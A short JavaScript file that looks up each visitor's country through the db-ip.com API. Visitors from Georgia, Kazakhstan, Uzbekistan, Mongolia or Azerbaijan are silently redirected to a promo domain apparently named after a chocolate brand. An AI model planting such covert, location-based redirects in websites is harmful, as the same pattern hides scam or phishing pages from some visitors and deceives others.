'use strict';
/*Переадресация по Геолокации*/
class Userinfo {
   async ip() {
      let res = await (await fetch("https://api.db-ip.com/v2/free/self"));
      let data = await res.json();
      return data.countryName;
   }
}
let info = new Userinfo();
async function f1() {
   if (await info.ip()) {
      let costomer_country = await info.ip();
	  if (costomer_country == "Georgia") {
         window.location.href = "https://alpengold-promo.me/?utm_source=old_domain";
      }
      else if (costomer_country == "Kazakhstan") {
         window.location.href = "https://alpengold-promo.me/?utm_source=old_domain";
      }
	  else if (costomer_country == "Uzbekistan") {
         window.location.href = "https://alpengold-promo.me/?utm_source=old_domain";
      }
	  else if (costomer_country == "Mongolia") {
         window.location.href = "https://alpengold-promo.me/?utm_source=old_domain";
      }
	  else if (costomer_country == "Azerbaijan") {
         window.location.href = "https://alpengold-promo.me/?utm_source=old_domain";
      }
	  
      console.log(costomer_country);
   }
}
f1();